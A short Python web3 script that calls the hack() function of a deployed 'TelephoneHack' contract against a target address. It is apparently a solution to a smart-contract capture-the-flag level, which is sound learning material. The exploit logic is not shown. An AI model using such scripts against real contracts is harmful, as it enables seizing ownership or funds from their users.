from commom import get_w3, get_contract

CONTRACT_NAME = 'TelephoneHack'
CONTRACT_ADDRESS = '0xb93647f68Db55A64981Eb679903dEFafDD24a838'

def main():
    w3 = get_w3()
    contract = get_contract(contract_address=CONTRACT_ADDRESS, contract_name=CONTRACT_NAME)

    tx = contract.functions.hack('0xbA613f8A0EB9CeCbb8D1093557E48db62D830a90').transact()
    receipt = w3.eth.wait_for_transaction_receipt(tx)
    print(receipt.status)

if __name__ == '__main__':
    main()